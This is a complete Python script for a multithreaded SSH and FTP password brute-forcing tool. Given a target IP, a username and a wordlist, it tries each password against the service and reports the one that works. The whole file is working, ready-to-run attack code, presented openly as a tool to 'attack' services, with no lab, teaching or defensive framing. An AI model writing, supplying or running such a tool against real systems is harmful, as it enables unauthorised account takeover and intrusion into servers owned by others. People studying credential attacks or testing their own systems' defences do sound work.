import paramiko
import ftplib
import argparse
import threading
from datetime import datetime

found = threading.Event()
print_lock = threading.Lock()
log_file = None


def log(msg):
    with print_lock:
        print(msg)
        if log_file:
            log_file.write(msg + "\n")
            log_file.flush()


def ssh_try(target, port, username, password):
    if found.is_set():
        return
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, port=port, username=username,
                       password=password, timeout=3, banner_timeout=5)
        ts = datetime.now().strftime("%H:%M:%S")
        log(f"[{ts}] [+] SUCCESS! Password found: {password}")
        found.set()
        client.close()
    except paramiko.AuthenticationException:
        ts = datetime.now().strftime("%H:%M:%S")
        log(f"[{ts}] [-] Failed: {password}")
    except Exception as e:
        log(f"[!] Error ({password}): {e}")


def ftp_try(target, port, username, password):
    if found.is_set():
        return
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=10)
        ftp.login(username, password)
        ts = datetime.now().strftime("%H:%M:%S")
        log(f"[{ts}] [+] SUCCESS! Password found: {password}")
        found.set()
        ftp.quit()
    except ftplib.error_perm:
        ts = datetime.now().strftime("%H:%M:%S")
        log(f"[{ts}] [-] Failed: {password}")
    except Exception as e:
        log(f"[!] Error ({password}): {e}")


def brute(target, port, username, wordlist, service, threads):
    print(f"\n[*] Target   : {target}:{port}")
    print(f"[*] Service  : {service.upper()}")
    print(f"[*] Username : {username}")
    print(f"[*] Wordlist : {wordlist}")
    print(f"[*] Threads  : {threads}\n")

    worker = ssh_try if service == "ssh" else ftp_try
    active = []

    with open(wordlist, "r", errors="ignore") as f:
        for line in f:
            if found.is_set():
                break
            password = line.strip()
            if not password:
                continue
            t = threading.Thread(target=worker, args=(target, port, username, password))
            t.start()
            active.append(t)
            if len(active) >= threads:
                for t in active:
                    t.join()
                active = []

    for t in active:
        t.join()

    if not found.is_set():
        print("\n[-] Password not found in wordlist.")


parser = argparse.ArgumentParser(description="Brute Force Tool — SSH and FTP")
parser.add_argument("-t", "--target", required=True, help="Target IP address")
parser.add_argument("-p", "--port", type=int, help="Port (default: 22 for SSH, 21 for FTP)")
parser.add_argument("-u", "--username", required=True, help="Username to brute force")
parser.add_argument("-w", "--wordlist", required=True, help="Path to password wordlist")
parser.add_argument("-s", "--service", choices=["ssh", "ftp"], default="ssh", help="Service to attack (default: ssh)")
parser.add_argument("-T", "--threads", type=int, default=4, help="Number of threads (default: 4)")
parser.add_argument("-o", "--output", help="Save results to a log file")
args = parser.parse_args()

if args.output:
    log_file = open(args.output, "w")

port = args.port or (22 if args.service == "ssh" else 21)

try:
    brute(args.target, port, args.username, args.wordlist, args.service, args.threads)
finally:
    if log_file:
        log_file.close()
        print(f"\n[*] Results saved to {args.output}")
